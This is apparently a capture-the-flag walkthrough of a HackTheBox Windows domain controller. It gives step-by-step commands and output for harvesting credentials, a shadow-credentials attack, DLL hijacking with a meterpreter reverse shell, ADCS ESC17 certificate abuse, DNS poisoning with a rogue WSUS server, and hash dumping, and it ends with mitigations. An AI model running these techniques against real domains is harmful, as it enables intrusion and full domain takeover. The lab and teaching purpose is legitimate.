<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
  <img src="https://img.shields.io/badge/OS-Windows-blue?style=for-the-badge&logo=windows" alt="OS Windows" />
  <img src="https://img.shields.io/badge/Difficulty-Medium-yellow?style=for-the-badge" alt="Medium Difficulty" />
</p>

# Logging Notes

## Step 1 - Reconnaissance

```bash
nmap -A -sS -P -T4  --min-rate 5000 10.129.23.177
```

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-19 13:54 UTC
Nmap scan report for 10.129.23.177
Host is up (0.22s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
...
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-19 20:54:28Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: logging.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-04-19T20:55:38+00:00; +7h00m10s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
...
445/tcp  open  microsoft-ds?
...
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
...
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 85.79 seconds
```

> — A Medium level windows box!
> — we also got some initial creds as well **wallace.everette / Welcome2026@**
> — SMB confirmation?

```bash
nxc smb 10.129.23.177 -u 'wallace.everette' -p 'Welcome2026@'
```

```text
SMB         10.129.23.177   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:False)
SMB         10.129.23.177   445    DC01             [+] logging.htb\wallace.everette:Welcome2026@
```

> — Now lets dig into some users

```bash
nxc smb 10.129.23.177 -u 'wallace.everette' -p 'Welcome2026@' --users
```

```text
...
SMB         10.129.23.177   445    DC01             svc_recovery                  2026-04-16 23:09:49 0
SMB         10.129.23.177   445    DC01             jaylee.clifton                2026-04-16 23:09:49 0
SMB         10.129.23.177   445    DC01             wallace.everette              2026-04-16 23:09:50 0
...
SMB         10.129.23.177   445    DC01             [*] Enumerated 12 local users: logging
```

> — Now lets look at some shares!

```bash
nxc smb 10.129.23.177 -u 'wallace.everette' -p 'Welcome2026@' --shares
```

```text
...
SMB         10.129.23.177   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.23.177   445    DC01             Logs            READ
SMB         10.129.23.177   445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.23.177   445    DC01             SYSVOL          READ            Logon server share
...
```

> — we got read permissions over 4 shares!
> — The interesting share is Logs, the rest of the shares are just default, i thought maybe there would be another script path file to be changed if had any writeable permission. but unfortunately there isn't

```bash
smbclient //10.129.23.177/Logs -U 'logging.htb\wallace.everette%Welcome2026@'
```

```text
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Apr 16 23:10:09 2026
  ..                                  D        0  Thu Apr 16 23:10:09 2026
  Audit_Heartbeat.log                 A     1294  Thu Apr 16 23:10:09 2026
  IdentitySync_Trace_20260219.log      A     8488  Thu Apr 16 23:10:09 2026
  Service_State.log                   A      468  Thu Apr 16 23:10:09 2026
  TaskMonitor.log                     A     1170  Thu Apr 16 23:10:09 2026
```

> — save them in your machine.
> — take a look at IdentitySync_Trace_20260219.log this log!

```text
...
[2026-02-09 03:00:03.110] [PID:4102] [Thread:04] TRACE - Initializing LdapConnection object...
[2026-02-09 03:00:03.125] [PID:4102] [Thread:04] VERBOSE - ConnectionContext Dump: { Domain: "logging.htb", Server: "DC01", SSL: "False", BindUser: "LOGGING\svc_recovery", BindPass: "Em3rg3ncyPa$$2025", Timeout: 30 }
[2026-02-19 03:00:03.488] [PID:4102] [Thread:04] ERROR - System.DirectoryServices.Protocols.LdapException: A local error occurred.
...
```

> — We got Creds for **svc_recovery:Em3rg3ncyPa$$2025**
> — Now While looking at the Bloodhound, i found out that

```text
	svc_recovery
	     ↓
	 GenericWrite
	     ↓
	 msa_health$
	     ↓
	  memberOF
 	     ↓
      Remote Management  (probably will get User Flag!)
```

* What is GenericWrite? Generic Write (GenericWrite) in Active Directory (AD) is a powerful, high-level permission that allows a user or group (the trustee) to modify most, but not all, of the properties (attributes) on a specific AD object, such as a user, computer, or group. Unlike Generic All, which grants full control (including deleting objects or changing permissions), Generic Write focuses on the ability to update data within the object

* Will Do kerberoasting! Kerberoasting: An attacker can write to the servicePrincipalNames (SPN) attribute of a user object to make it a service account, then initiate a Kerberoasting attack to crack the account's password.

> — Now lets add svc_recover to msDS-GroupMSAMembership

* msa_health$ is a Group Managed Service Account (gMSA). gMSAs have auto-rotating passwords managed by AD — but certain principals (users/computers) are allowed to retrieve that password. **That allowlist is stored in the attribute msDS-GroupMSAMembership.**

> — Lets attack!

```bash
bloodyAD -u svc_recovery -p 'Em3rg3ncyPa$$2026' \
         -d logging.htb \
         --host 10.129.23.177 \
         add groupMember msa_health$ svc_recovery
```

```text
Traceback (most recent call last):
...
msldap.commons.exceptions.LDAPBindException: LDAP Bind failed! Result code: "invalidCredentials" Reason: "b'8009030C: LdapErr: DSID-0C0906F8, comment: AcceptSecurityContext error, data 52f, v4563\x00'"
```

> — Lets Ensure the Creds!

```bash
nxc smb 10.129.23.177 -u svc_recovery -p 'Em3rg3ncyPa$$2026'
```

```text
SMB         10.129.23.177   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:False)
SMB         10.129.23.177   445    DC01             [-] logging.htb\svc_recovery:Em3rg3ncyPa$$2025 STATUS_ACCOUNT_RESTRICTION
```

> — Also I have found out that svc_recovery is a member of Protected Users OU!
> — Lets Try Getting the TGT for this user and then will proceed

```bash
getTGT.py 'logging.htb/svc_recovery:Em3rg3ncyPa$$2026' -dc-ip 10.129.24.106
```

```text
Impacket v0.14.0.dev0+20251114.155318.8925c2ce - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in svc_recovery.ccache
```

> — Ensure!

```bash
klist
```

> — Now lets add the account to the read list!

```bash
bloodyAD -u svc_recovery -k \
         -d logging.htb \
         --host dc01.logging.htb \
         set object msa_health$ msDS-GroupMSAMembership \
         -v 'CN=svc_recovery,CN=Users,DC=logging,DC=htb'
```

```text
Traceback (most recent call last):
...
IndexError: list index out of range
```

> — This attribute expects a Security Descriptor in binary format, but the tool is attempting to parse the input string (the Distinguished Name of svc_recovery) as if it were SDDL (Security Descriptor Definition Language). When it fails to find the expected SDDL components, it throws the IndexError: list index out of range.
> — I also tried with add principalAllowedToDelegate to get an upper hand retrieve the password, but it didn't worked. as GenricWrite might not have this attribute to be changed!
> — Now Is there any other way to get the msa_health Password? Well Yes~
> — Shadow Credentials —

* Normal Windows auth flow: User has password → proves identity to DC → gets access
* Shadow Credentials abuses a feature called PKINIT — which lets you authenticate using a certificate (public/private key pair) instead of a password.
* Every AD object has an attribute called msDS-KeyCredentialLink which stores trusted certificates for that account. If you have GenericWrite on an object, you can add your own certificate to that attribute:
  Attacker generates cert keypair
         ↓
  Writes cert into msa_health$'s msDS-KeyCredentialLink
         ↓
  DC now trusts that cert to authenticate AS msa_health$
         ↓
  Attacker uses private key to get TGT as msa_health$
         ↓
  Extract NT hash → WinRM in

> — easy, lets do some action now!

## Step 2 - Initial Foothold

> — As we already have the TGT for svc_recovery, lets try adding shadow creds directly!

```bash
bloodyAD -u svc_recovery -k \
         -d logging.htb \
         --host dc01.logging.htb \
         add shadowCredentials msa_health$
```

```text
[+] KeyCredential generated with following sha256 of RSA key: 6b872e5e15c4069dfa9b46b06e10e94d6def5ff6e3c75165fd47d924568cc104
[+] TGT stored in ccache file msa_health$_1J.ccache

NT: 603fc24ee01a9409f83c9d1d701485c5 #Gold!!
```

> — Well this is interesting!
> — Modern BloodyAD all work for us

* Context:
  bloodyAD add shadowCredentials
         ↓
  Generates RSA keypair internally
         ↓
  Writes cert to msDS-KeyCredentialLink (uses svc_recovery's GenericWrite)
         ↓
  Immediately performs PKINIT auth using the cert
         ↓
  Uses the resulting TGT to call KERB-AS-REP and derive NT hash
         ↓
  Dumps everything: ccache + NT hash

> — Lets Get shell then!!

```bash
evil-winrm -i logging.htb -u 'msa_health$' -H '603fc24ee01a9409f83c9d1d701485c5'
```

> — unfortunately no flag :), Also there is no clear outbound object control for this account!
> — Since there is no clear Bloodhound path, we need to enumerate this shell for further pivot
> — As it is a very Restricted shell. because it is a Service Managed Account, it doesn't lets us run Administrative Binaries, CMI/WMI commands, Service Managements and Registry Access AS well.
> — Then lets look for some Installed anomalies, maybe we can find something there!

```powershell
*Evil-WinRM* PS C:\Program Files> ls
```

```text
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
...
d-----        4/16/2026   4:10 PM                UpdateMonitor
...
```

> — Looking at the Files, these are all Standard Windows Files, while the UpdateMonitor might not be a Standard Windows file, it looks like a Third-party anomaly.
> — Now lets see if we can Write this folder?

```powershell
icacls "C:\Program Files\UpdateMonitor"
```

```text
C:\Program Files\UpdateMonitor logging\IT:(OI)(CI)(F)
                               NT SERVICE\TrustedInstaller:(I)(F)
...
```

> — The Output shows that Every User From IT OU has full access over this File, Since msa_health$ doesn't belongs to IT$ group, The IT$ Group has only one User jaylee.clifto.

```powershell
*Evil-WinRM* PS C:\Program Files> icacls "C:\Program Files\UpdateMonitor\UpdateMonitor.exe"
```

```text
C:\Program Files\UpdateMonitor\UpdateMonitor.exe logging\IT:(I)(F)
...
```

> — Also we can't access the .exe file as well, since only member from IT group can modify it through inherited Permissions!, means we cannot directly replace the executable!
> — Since there is only 1 member in IT group jaylee.clifto, that means this executable might be running as user jaylee.clifto
> — well While looking at the ProgramData Folder, i found a Logs file for UpdateMonitor!

```powershell
*Evil-WinRM* PS C:\ProgramData\UpdateMonitor\Logs> cat monitor.log
```

```text
[2026-04-16 16:41:18] Starting Sentinel Update Check...
[2026-04-16 16:41:18] Checking for update on core server...
[2026-04-16 16:41:18] Info: Core did not find file Settings_Update.zip
[2026-04-16 16:41:18] Last status: File not found on core
[2026-04-16 16:41:18] Checking for update on local server...
[2026-04-16 16:41:18] No updates found locally: C:\ProgramData\UpdateMonitor\Settings_Update.zip.
[2026-04-16 16:41:18] Loading update applier: C:\Program Files\UpdateMonitor\bin\settings_update.dll
[2026-04-16 16:41:18] Failed to load settings_update.dll. Error code: 126
```

> — Interesting! So there this UpdateMonitor.exe loads a Settings_Update.zip file from C:\ProgramData\UpdateMonitor\Settings_Update.zip path, and then extracts it and maybe runs it in C:\Program Files\UpdateMonitor\bin\settings_update.dll

* Attack Plan:-
  > Will Create a dll file with Reverse Shell to our nc listener
  > Will convert it to .zip format
  > Will upload the file into  C:\ProgramData\UpdateMonitor as Settings_Update.zip
  > The Scheduled Task will extract the zip file and load it into C:\Program Files\UpdateMonitor\bin\settings_update.dll
  > The file get executed as jaylee.clifto!

> — Lets Begin!
> — Start With Creating a .dll file with reverse shell payload

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST="your_ip" LPORT=6666 \
    -f dll -o settings_update.dll
```

> — Set Up a MS listener

```bash
sudo msfconsole -q \
    -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 6666; run"
```

> — Convert the dll into zip

```bash
zip Settings_Update.zip settings_update.dll
```

> — Upload The file!

```powershell
*Evil-WinRM* PS C:\ProgramData\UpdateMonitor> upload Settings_Update.zip
```

> — Check Listener!

```text
[*] Sending stage (188998 bytes) to 10.129.44.87
[*] Meterpreter session 1 opened (10.10.14.****:6666 -> 10.129.44.87:61364) at 2026-04-23 14:27:36 +0000

meterpreter > getuid
Server username: logging\jaylee.clifton
```

> — Also check At the logs

```text
[2026-04-23 14:53:15] Successfully unzipped update to C:\Program Files\UpdateMonitor\bin\
[2026-04-23 14:53:15] Loading update applier: C:\Program Files\UpdateMonitor\bin\settings_update.dll
```

## Step 3 - Privilege Escalation

> — As the meterprete shell doesn't supports the powershell for this user, we need to get its TGT in order enumerate!
> — Upload Rubeus.exe to meterprete shell

```powershell
upload /home/kali/Tools/Rubeus/Rubeus/Rubeus.exe C:\\Users\\Public
```

> — Now get the TGT

```powershell
C:\temp>.\Rubeus.exe tgtdeleg /nowrap
```

```text
[*] base64(ticket.kirbi):

      doIFyDCCBcSgAwIBBaEDAgEWooIEyjCCBMZhggTCMIIEvqADAgEFoQ0bC0xPR0dJTkcuSFRCoiAwHqADAgECoRcwFRsGa3JidGd0GwtMT0dHSU5HLkhUQqOCBIQwggSAoAMCARKhAwIBAqKCBHIEggRuinaHjSnK4H3+76qTnTuJtdNPVj9GkpJW0kBE8SsQu7ulvVA/HuqBdu5LnwTcopvyeqlhU1xwT3X6a/5D+c/H8Zu0MC+NboZSJq4E+vkoZiaxNa9e2eyk8BQ1kl5Jv/OKKnLp5GFRCMvbYX82HEyan94aR5+pzC38RmGJv4fhkso+iRbWTluA0kRJpPXVE3BAMR50hbJXH+VwJZy7kR32+1EYK/vJeqwpDmGh/mgma8XwUf5wdd7NqPs3rixtVZoHEeb7C0wnIf780xdGDdH2weEM5AVZzUwDS2P5RJhSnYnSKUIcDZeBNWGUE16Y1PIoFr7cM9RBn9raG7qKosXe0mXRWsAt7jus8eR0RLA4zJKB35J8e0hTLtYjw3dXFOk3zJ98yzYR72agfuD5b2SqdHITg55EWVyMLQFVJGz44zuL0o30FBwCYFJQtvh6eb99SL8tq6dhsQA4Ha9VtHEAk/btvHh7Su0ESSnwU4CfNp7/0qbB5ueCm5KzSgFtzFSEzKL4OHEnnmroRjFpWoZNElZ/H8eyLE/8kLKhXoVL4mcWy/dR/fRErMWmjH+71txB6eXaylR0bCtFF81afH5joHjAPDLxbfyLFOWa5XYiCeJcYr+/NX1ojqeSWdHN2Ql31NZUTiMVHZeg2HnZZU9L4b+QpKVwWk3BI3jYhLCBCYQrIFvYJHiAsevhtJxUm3Jmt9sbZNqjoBx/0R8Kvyr7dMWpUoWf4aDRm3IsNR4l3gGqRgURip2A0svqh6x5laGTtK6RqXAg3DtUFSXEq4fFsaMACcxENlsIUcbTtDYxKiOiCaMfRqYmX90sYvLlzwknBojqFJQkUMsCgO06YgxKVuYoaxwHZm6+jzmQdO5O5RUXesonq7lYjOx4hvJxXySzihieZp4m8VTYHn+8qplbnw+Fkh8V+omVy6ocHV/5ZLVjCB4PeMjakBKs2hhvj0S4gR/j9gVNokooIwCn1RIfkyBpo/69iqy+D3himqRALjuyzSpxJTJbtWjFRThPwlN5wTb+rMLlyMNC8mReesXs0m+oSoRKuwd2UIaMSb2Vivfvq59XbfD3B26wRGE04F32gyzkQpgbJn7hPCygGWJ6imECPTewOziXqGrtzg+V2rs9cIHlrLMuLnOndIPInhfSKVplef4fVvs+swfR1Vm/0GrTXsOLnFhKDK0i+bZ5Pp/ekIrrO0/cmThMJqvk2PTAzeOk/5TUVF+3e55n47s6mFzcGXH4x9SRJ+c/OXe2xU2Zq9OYOzwgvN0AtWrt+5PeVk0sOHFD8ZrOvuftWMvADbj1VowpZ+KqBGX5a4FZAUKtdSb0SAPPFWrXU7P8KOVwkw/xkOp8F1TwqhVn+bbHr1bgFaXuscGncIHBWshASanobqty0iNx/SN7BxmAlCO7hqx5GSHxA7IH4188F7ieKVvcrXInn6jpcQzPhtchXmY0YnvY0Mu7dXUw8BCatjdW23ZHAQ8G6YaGPR+0O9kqcMfPo82tIkffRNoJrYDRo4HpMIHmoAMCAQCigd4Egdt9gdgwgdWggdIwgc8wgcygKzApoAMCARKhIgQgYTO9mSJfirf3Z6DaIicdVmCJmWPCFzrSFxtMkJHsmXKhDRsLTE9HR0lORy5IVEKiGzAZoAMCAQGhEjAQGw5qYXlsZWUuY2xpZnRvbqMHAwUAYKEAAKURGA8yMDI2MDQyNDIxMzcwOFqmERgPMjAyNjA0MjUwNzMyMTVapxEYDzIwMjYwNTAxMjEzMjE1WqgNGwtMT0dHSU5HLkhUQqkgMB6gAwIBAqEXMBUbBmtyYnRndBsLTE9HR0lORy5IVEI=
```

> — Now save this in a .kirbi file

```bash
echo -n 'BASE64_HERE' | tr -d ' \r\n\t' | base64 -d > jaylee.kirbi
```

> — Convert now

```bash
ticketConverter.py jaylee.kirbi jaylee.ccache
```

> — Export and Ensure!

```bash
export KRB5CCNAME=jaylee.ccache
klist
```

> — We are good to enumerate now!
> — Now for enumeration there isn't a clear path in bloodhound, like no clear outbounds and permissions.
> — Also i have found i ADCS Misconfiguration.

```powershell
C:\Users\Public>certutil -v -template UpdateSrv
```

```text
...
34 Templates:

  Template[29]:
  TemplatePropCommonName = UpdateSrv
  TemplatePropFriendlyName = UpdateSrv
...
  TemplatePropSubjectNameFlags = 1
    CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT -- 1
...
  TemplatePropGeneralFlags = 20241 (131649)
    CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT -- 1
    CT_FLAG_MACHINE_TYPE -- 40 (64)
...
  Extension[1]:
    2.5.29.37: Flags = 0, Length = c
    Enhanced Key Usage
        Server Authentication (1.3.6.1.5.5.7.3.1)
...
CertUtil: -Template command completed successfully.
```

* What is ADCS? - Active Directory Certificate Services (AD CS) is a Windows Server role that allows an organization to act as its own Certificate Authority (CA). It provides a native Public Key Infrastructure (PKI) to issue, manage, and revoke digital certificates used for secure communication, device authentication, and data encryption

> — Hence we Found a Custom UpdateSrv Certificate and as it has, the  **CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT -- 1** Flag enabled, means we can ask for The Certificate using any Alternative Which is know as Subject Alternative Name (SAN). means we can also Request for the  Certificate using a Hight Privileged object's name! (Such as Administrator!)
> — We can do give it a shot, by trying to ask for a certificate using Administrator's Identity!

```powershell
C:\Users\Public>.\Certify.exe request /ca:dc01.logging.htb\logging-DC01-CA /template:UpdateSrv /altname:Administrator
```

```text
[*] CA Response             : The certificate had been issued.
...
[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

> — Okay Got the Certificate!
> — as we got the certificate we can ask for the TGT for admin using Rebueus!

```powershell
PS C:\ProgramData> .\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:Password123! /ptt
```

```text
[*] Using PKINIT with etype rc4_hmac and subject: CN=jaylee.clifton, CN=Users, DC=logging, DC=htb
[*] Building AS-REQ (w/ PKINIT preauth) for: 'logging.htb\administrator'
[*] Using domain controller: ::1:88

[X] KRB-ERROR (6) : KDC_ERR_C_PRINCIPAL_UNKNOWN
```

> — Shoot! this failed?
> — After Searching for a bit, i have understood why it failed, there are 2 main reasons for that!

1. The Subject Identity Mismatch:
   Look closely at the Rubeus output:[*] Using PKINIT with etype rc4_hmac and subject: CN=jaylee.clifton, CN=Users, DC=logging, DC=htb
   Even though we supplied /altname:Administrator in our Certify request, the Certificate Authority (CA) completely ignored or stripped that value. The final certificate was generated with our low-privileged user identity (jaylee.clifton) inside the Subject field. When Rubeus tried to use that certificate to authenticate as the administrator account, the KDC rejected the request because the certificate identity (jaylee.clifton) did not match the requested Kerberos principal (administrator).
2. Missing Extended Key Usage (EKU)
   As confirmed by your earlier certutil scan, the UpdateSrv template is strictly configured for Server Authentication only (1.3.6.1.5.5.7.3.1).
   For Rubeus to successfully execute asktgt via PKINIT, the certificate must possess either Client Authentication (1.3.6.1.5.5.7.3.2) or Smartcard Logon (1.3.6.1.4.1.311.20.2.2).
   Because those properties are missing, the KDC refuses to issue a user session ticket (TGT) using this certificate, regardless of the account name specified.

> — Now While looking at the Certutil Output Properly there are 4 attributes aligned!

1. Enrollee Supplies Subject : True: The requester can define the identity properties of the issued certificate.
2. Client Authentication : False (or missing): The certificate cannot be used to natively authenticate users via standard Kerberos/PKINIT (ruling out standard ESC1).
3. Server Authentication : True (or specific application policies): The certificate is trusted to prove the cryptographic identity of server endpoints or applications.
4. CT_FLAG_MACHINE_TYPE is enabled: The template is designed to mint identities for infrastructure objects (computers/servers) rather than human users.

> — This Leads to an ESC17 Exposure, as it possess all the attributes.

* ESC17 represents a shift from User Impersonation to Infrastructure / Server Spoofing.
  Because Active Directory services often trust internal servers implicitly based on their machine certificates, obtaining a valid Server Authentication certificate for a critical network asset (wsus.logging.htb) removes the necessity of a direct user logon path. Instead, it allows an operator to insert an attacking system directly into the trust topology of the domain's update management cycle, leading to administrative control over systems contacting the rogue update server.
* What is WSUS and how it will be helpful? -Windows Server Update Services (WSUS) is a free Microsoft server role that allows IT administrators to centrally manage and distribute software patches, security updates, and hotfixes to computers within a corporate network. It eliminates the need for every device to download updates individually directly from the internet.
* In enterprise environments, administrators create custom templates for specific IT operations. A template named UpdateSrv that is configured as a machine-type template with Server Authentication points directly to the environment's Windows Update Infrastructure (WSUS). The administrator designed this template so the update server could automatically request and renew its own SSL/TLS transport certificate
* Also WSUS hold a Higher privilege Position in the AD
* SYSTEM Level Access: Every computer in the domain periodically connects to the WSUS server, asks for software updates, and installs them automatically under the highest local privilege level: NT AUTHORITY\SYSTEM.
* The Security Blind Spot: Ordinarily, computers reject untrusted update packages. However, because we can abuse UpdateSrv to generate a legitimate, CA-signed certificate for wsus.logging.htb, the client computers will implicitly trust our rogue server

> — Lets look for the Registries first!

```powershell
C:\Windows\system32>reg query "HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate" /v WUServer
```

```text
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
    WUServer    REG_SZ    https://wsus.logging.htb:8531
```

> — We have discovered the WSUS!
> — Now we can request for a certificate with altname as wsus, as it is the only way to steal the identity of the update server, using UpdateSrv template!
> — Upload Certify.exe

```powershell
meterpreter > upload /home/kali/Tools/Certipy/Ghostpack-CompiledBinaries/Certify.exe C:\\Users\\Public
```

> — Now--> Request the Certificate

```powershell
C:\Users\Public>Certify.exe request /ca:dc01.logging.htb\logging-DC01-CA /template:UpdateSrv /altname:wsus.logging.htb
```

```text
[*] AltName                 : wsus.logging.htb
[*] Certificate Authority   : dc01.logging.htb\logging-DC01-CA
[*] CA Response             : The certificate had been issued.
```

> — We have successfully Obtained the Certificate, to ensure it, look at the altname parameter!
> — Now we need to save this context as .pem and then need to convert it into .pfx
> — after saving the context

```bash
openssl pkcs12 -in wsus.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out wsus.pfx
```

> — (note:- you can set any random password for the certificate to be exported as pfx)
> — Now we can connect the targets to our IP which are intended to go to the WSUS's IP

* How and Why?
  ---> Clients asks for the real IP of WSUS server as they don't recognize wsus.logging.htb.
  ---> DNS  Answers with an IP pointed to the wsus server
  ---> clients then request for their desired updates from that server, they ensure the  server's Identity by the certificate.
  .....Now Here's the catch
  ----> Since we own the certificate for wsus, means whenever the clients asks for authentication of wsus server, we can handover the certificate
  ----> Before Authorizing we can add a DNS record for wsus to our IP
  ----> whenever the client tries to connect to the wsus server, the request goes to our rogue server. and then we can simply authenticate our identity via the certificate
  ----> once we are authorized, we can feed them any malicious update!

> — Now first we need to redirect the clients to our IP instead of the real WSUS's IP, we need add the DNS record
> — (note:- Before doing this, ensure you have exported the TGT properly, you can check it via klist)
> — you can use bloodyAD as well as the native shell of CMD from meterpret as well

```bash
bloodyAD --host 10.129.245.130 -d logging.htb -k add dnsRecord wsus 10.10.15.169
```

> — Once The record is added, ensure it via nslookup

```bash
nslookup wsus.logging.htb 10.129.245.130
```

```text
Server:         10.129.245.130
Address:        10.129.245.130#53

Name:   wsus.logging.htb
Address: 10.10.15.169
```

> — We are good to go now!
> — Now we need to extract the crt and key from the pfx file we got earlier and combine it in a single pem file

```bash
openssl pkcs12 -in wsus.pfx -clcerts -nokeys -out wsus.crt -nodes
openssl pkcs12 -in wsus.pfx -nocerts -out wsus.key -nodes
cat wsus.crt wsus.key > wsus_combined.pem
```

> — (note:- you must ensure that the wsus.logging.htb has the entry inside your /etc/hosts with your IP)
> — now lets start the rogue wsus server with a command that adds msa_health to domain admins.

```bash
sudo wsuks --serve-only \
    --WSUS-Server wsus.logging.htb \
    --tls-cert wsus.pem \
    -I tun0 \
    -c '/accepteula /s powershell.exe -ExecutionPolicy Bypass -Command "Add-ADGroupMember -Identity \"Domain Admins\" -Members \"MSA_HEALTH$\""'
```

```text
[*] ===== Starting Web Server =====
[*] Using TLS certificate 'wsus.pem' for HTTPS WSUS Server
[*] Starting WSUS Server on 10.10.****.****:8531...
[*] Serving executable as KB: 5876493
[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: "http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetConfig"
...
[+] GET request for exe: /a5ace7c0-c255-4db3-891d-c57a6b8c323e/PsExec64.exe
```

> — The GET request for PsExec64 Ensures that the client has downloaded the Signed Binary
> — Now as we have attached the command that adds MSA_HEALTH$ to domain admins, we can use that same hash to get WinRM access

```bash
evil-winrm -i dc01.logging.htb -u 'msa_health$' -H 603fc24ee01a9409f83c9d1d701485c5
```

```powershell
*Evil-WinRM* PS C:\users> dir toby.brynleigh\desktop
```

```text
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        4/19/2026   1:16 PM             34 root.txt
```

> — Domain Compromised!

## Step 4 - Post Exploitation

> — With the MSA_HEALTH being a member of domain admins, we can dump the hashes

```bash
secretsdump.py \
    -hashes :603fc24ee01a9409f83c9d1d701485c5 \
    'logging.htb/msa_health$@dc01.logging.htb'
```

```text
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a0c1d1bed9126632f5f1f2b3f790bdb5:::
```

> — Now lets ask for the TGT for administrator

```bash
getTGT.py logging.htb/Administrator \
-hashes ':a0c1d1bed9126632f5f1f2b3f790bdb5'

export KRB5CCNAME=Administrator.ccache
```

> — Now lets acquire the shell

```bash
psexec.py -k -no-pass \
    'LOGGING.HTB/Administrator@dc01.logging.htb'
```

```text
Microsoft Windows [Version 10.0.17763.8644]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

> — Full Domain Compromised!

## Mitigation & Security Perspective

> [!CAUTION]
> **Information Disclosure via Insecure SMB Share**
> A standard user account (`wallace.everette`) was able to read the `Logs` SMB share, which contained `IdentitySync_Trace` logs holding plaintext credentials for `svc_recovery`. 
> **Mitigation:** Sensitive log files containing service account passwords or binding details must never be stored on open or loosely permissioned file shares. Rotate `svc_recovery`'s password immediately and restrict SMB share permissions to only authorized administrative personnel. 

> [!WARNING]
> **Shadow Credentials Attack (PKINIT Abuse)**
> The `svc_recovery` account possessed `GenericWrite` permissions over the Group Managed Service Account `msa_health$`. This allowed the attacker to append a rogue certificate to the `msDS-KeyCredentialLink` attribute and request a Kerberos Ticket Granting Ticket (TGT) on behalf of `msa_health$` using PKINIT (Shadow Credentials attack).
> **Mitigation:** Continually audit Active Directory access control lists (ACLs) using tools like BloodHound to detect untrusted accounts with `GenericWrite`, `GenericAll`, or `WriteDacl` permissions over critical objects, especially service accounts. Remove `GenericWrite` for `svc_recovery` over `msa_health$`.

> [!CAUTION]
> **Scheduled Task Executing Unverified Payloads**
> A scheduled task running as `jaylee.clifton` (a member of the `IT` group) extracted a globally writable ZIP file (`Settings_Update.zip` in `C:\ProgramData\UpdateMonitor`) and blindly loaded `settings_update.dll` without signature verification. This enabled arbitrary Remote Code Execution.
> **Mitigation:** Directories used for temporary file extraction and execution must strictly prohibit write access from standard users or service accounts. Furthermore, ensure that scheduled tasks or services enforce Authenticode signature validation before loading external DLLs or executables to prevent DLL hijacking/sideloading.

> [!CAUTION]
> **ADCS Misconfiguration - ESC17 (Rogue WSUS Server)**
> The `UpdateSrv` certificate template was vulnerable to ESC17. It required `Server Authentication` (EKU), allowed the enrollee to supply the Subject Alternative Name (SAN), and was marked as a machine-type template. The attacker exploited this by requesting a certificate for the domain's update server (`wsus.logging.htb`), poisoning the DNS record, and hosting a rogue WSUS server to push a malicious update granting Domain Admin privileges.
> **Mitigation:** 
> 1. Disable `ENROLLEE_SUPPLIES_SUBJECT` on certificate templates meant for server authentication unless absolutely necessary, and enforce CA manager approval for such templates.
> 2. Ensure that DNS records for critical infrastructure components (like WSUS) cannot be arbitrarily overwritten by standard users or compromised IT accounts.
> 3. Enforce WSUS communications over HTTPS and require strict certificate pinning or explicit trust validation to prevent rogue WSUS servers from distributing malicious payloads.
